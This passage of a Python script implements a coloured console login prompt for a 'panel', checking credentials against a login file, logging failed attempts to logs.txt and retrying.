    print(F"{Fore.BLUE}LOGIN TO PANEL {Fore.WHITE}({Fore.LIGHTBLUE_EX}TRYING LOGIN WITH {username}@{password}{Fore.WHITE}) . . .{Fore.RESET}")
    time.sleep(int(random.randint(1,3)))
    if login_checker(username,password) == True:
     print(f"{Fore.CYAN}PANEL LOADING . . .{Fore.RESET}")
     time.sleep(1)
     clear_console()
     PANEL_USE()
    elif login_checker(username,password) == 'UNKNOWN ERROR ARE RETURNING BY FILESNOTFOUND':
        print(f"{Fore.RED}UNKNOWN ERROR OF FILES 'login.txt'{Fore.RESET}")
        FILES_MAKER(os.path.join(os.path.dirname(__file__),'logs.txt'),'A',f'[failed] {GET_TIME()} - NOT FOUND login.txt/logins.txt\n')
        time.sleep(1)
        checker_login()
    else:
     FILES_MAKER(os.path.join(os.path.dirname(__file__),'logs.txt'),'A',f"[failed] {GET_TIME()} - CAN'T LOGIN \n")
     print(f"{Fore.RED}FAILED {Fore.YELLOW}LOGIN . . .{Fore.RESET}")
     time.sleep(1)
     checker_login()
